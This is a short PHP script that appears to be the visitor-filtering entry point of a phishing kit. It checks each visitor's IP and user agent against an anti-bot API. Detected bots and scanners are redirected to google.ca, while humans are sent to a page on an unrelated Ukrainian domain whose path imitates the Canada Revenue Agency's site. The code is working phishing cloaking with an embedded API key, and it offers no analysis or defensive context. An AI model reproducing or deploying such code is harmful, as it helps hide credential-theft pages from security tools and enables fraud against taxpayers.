<?php 
error_reporting();
session_start();

#######################################################################################################
$config_antibot['apikey']   = 'd3c4c282b03deee1972aab2722aeaf48'; //https://antibot.pw/developers
$config_antibot['bot']      = 'https://www.google.ca';
$config_antibot['real']     = 'https://stravel.com.ua/ca2020/cra.arc.canada.ca/';
#######################################################################################################

class Antibot
{
    function apikey($api_key){
        $this->apikey = $api_key;
    }
    function get_client_ip()
	{
	    // Get real visitor IP behind CloudFlare network
	    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
	              $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
	              $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
	    }
	    $client  = @$_SERVER['HTTP_CLIENT_IP'];
	    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
	    $remote  = $_SERVER['REMOTE_ADDR'];
	
	    if(filter_var($client, FILTER_VALIDATE_IP))
	    {
	        $ip = $client;
	    }
	    elseif(filter_var($forward, FILTER_VALIDATE_IP))
	    {
	        $ip = $forward;
	    }
	    else
	    {
	        $ip = $remote;
	    }
	
	    return $ip;
	}
    function httpGet($url){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($ch);
        return $response;
    }
    function check(){
        $ip         = $this->get_client_ip();
        $respons    = $this->httpGet("https://antibot.pw/api/v2-blockers?ip=".$ip."&apikey=".$this->apikey."&ua=".urlencode($_SERVER['HTTP_USER_AGENT']));
        $json       = json_decode($respons,true);
        if($json['is_bot'] == 1 || $json['is_bot'] == true){
            return true;
        }else{
            return false;
        }
    }
}
$Antibot = new Antibot;
$Antibot->apikey( $config_antibot['apikey'] );
if($Antibot->check() == true){
    die(header("location: ".$config_antibot['bot']));
}else{
    die(header("location: ".$config_antibot['real']));
}
?>